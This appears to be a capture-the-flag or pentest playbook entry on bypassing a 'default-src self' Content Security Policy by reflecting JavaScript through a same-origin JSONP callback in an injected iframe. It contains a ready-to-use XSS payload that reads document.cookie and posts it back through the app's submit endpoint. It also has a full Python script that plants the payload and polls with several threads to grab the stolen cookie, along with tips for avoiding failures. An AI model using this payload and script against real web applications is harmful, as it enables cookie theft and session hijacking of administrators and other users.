# JSONP Callback + Iframe Cookie Exfil (CSP-bypass via Same-Origin Reflection)

## When this applies

- Target page has CSP `default-src 'self'` (no `'unsafe-inline'`, no external script-src) — inline `<script>` and `onerror=` blocked, external scripts from same-origin allowed.
- Target page has innerHTML-style HTML injection in some user-controlled field rendered on a page reachable by an admin / bot.
- Target page also exposes a JSONP endpoint of the form `/api/jsonp?callback=NAME` that returns `<NAME>(<json_data>)` with `Content-Type: application/javascript`.
- Target has a same-origin page (often `/list`, `/dashboard`) whose own JS reads `?callback=` from `location.search` and injects `<script src="/api/jsonp?callback=<value>">` into the DOM.
- A headless-Chrome bot (Puppeteer / Selenium) visits the page on a schedule with a sensitive cookie attached.

This is the classic CSP-bypass shape from "Alien Complaint Form"-style challenges and similar real-world apps that ship a "ng-include"-style helper next to a JSONP endpoint.

## Technique

Inject an iframe whose `src` points at the same-origin loader page with the malicious `callback` parameter:

```html
<iframe src="/list?callback=let x = {'complaint':document.cookie};fetch('/api/submit',{method:'post',headers:{'Content-Type':'application/json'},body:JSON.stringify(x)})"></iframe>
```

Inside the iframe:
1. Browser loads `/list` (same-origin) — CSP allows.
2. The page's own `jsonp()` helper reads `?callback=` from URL → injects `<script src="/api/jsonp?callback=<JS>">` into the iframe's document.
3. Server returns `<JS>(<feedback JSON>)` as `application/javascript` — script executes (allowed by CSP `script-src 'self'`).
4. The JS exfils whatever it has access to (`document.cookie` if not HttpOnly, fetched content from admin-only endpoints) by POSTing it back to a `/api/submit`-style endpoint as a new record.
5. Read the exfiltrated record by polling the same JSONP endpoint without a callback (defaults to `display(<feedback>)` rendering all rows).

## ⚠ Critical: bare statements, NOT IIFE wrapper

The reflected payload becomes `<JS>(<feedback JSON>)` after the server prepends the callback name and parens. The structure of the JS matters:

| Form | Reflected | Behavior |
|---|---|---|
| `((d)=>{ fetch(...) })` (IIFE) | `((d)=>{ fetch(...) })(<feedback>)` | Closure called with feedback; **silently fails to fire fetch in puppeteer headless Chrome** (empirically reproducible). |
| `let x = {...}; fetch(...)` (bare statements) | `let x = {...}; fetch(...)(<feedback>)` | Statements run; trailing `(<feedback>)` calls the Promise returned by `fetch()` and throws — but the throw fires AFTER `fetch()` is already dispatched. The exfil POST goes through. |

**Use bare statements.** The IIFE wrapper is the most common gotcha in this family of challenges.

## Probe + extraction recipe

```python
import urllib.request, json, time, threading, re, urllib.parse

URL = "http://<TARGET>"
JS = "let x = {'complaint':document.cookie};fetch('/api/submit',{method:'post',headers:{'Content-Type':'application/json'},body:JSON.stringify(x)})"
enc = urllib.parse.quote(JS, safe='')
complaint = f'<iframe src="/list?callback={enc}"></iframe>'

found = [None]
def poller(name):
    deadline = time.time() + 30
    while time.time() < deadline and not found[0]:
        try:
            b = urllib.request.urlopen(f"{URL}/api/jsonp?callback=cb", timeout=2).read().decode()
            for m in re.finditer(r'<MARKER>:[^"]+', b):  # the marker your exfil-JS prepended
                found[0] = m.group(0); print(f"[{name}] {found[0]}"); return
        except Exception: pass
        time.sleep(0.05)

[threading.Thread(target=poller, args=(f"p{i}",), daemon=True).start() for i in range(6)]
time.sleep(0.3)

body = json.dumps({"complaint": complaint}).encode()
urllib.request.urlopen(urllib.request.Request(f"{URL}/api/submit", data=body,
    headers={"Content-Type":"application/json"}, method="POST"), timeout=10).read()
```

## Anti-Patterns

- IIFE wrapper around the exfil JS — silently fails.
- Single-thread polling at 1-2 Hz — the exfil row is dropped by the bot's post-visit migrate within ~1-2 seconds.
- Trying inline `<script>` / `onerror=` payloads against `default-src 'self'` (no `'unsafe-inline'`) — blocked.
- Trying `<svg><script>` injected via innerHTML — HTML5 parser disables script execution from innerHTML in modern Chromium regardless of element type.
- Trusting puppeteer's `waitUntil: 'networkidle2'` to gate iframe content — per puppeteer docs only main-frame requests count, so the iframe's chain races against `browser.close()`.

## Cross-references

- General XSS CSP-bypass tactics: [../../xss-bypass-techniques.md](../../xss-bypass-techniques.md) (the "JSONP on whitelisted domain" subsection covers the cross-origin variant; this file covers the same-origin reflection variant).
- Web-cache-poisoning + bot-driven exfil chain (different primitive, same goal): [../../../../web-app-logic/reference/scenarios/cache/poisoning-unkeyed-headers.md](../../../../web-app-logic/reference/scenarios/cache/poisoning-unkeyed-headers.md).
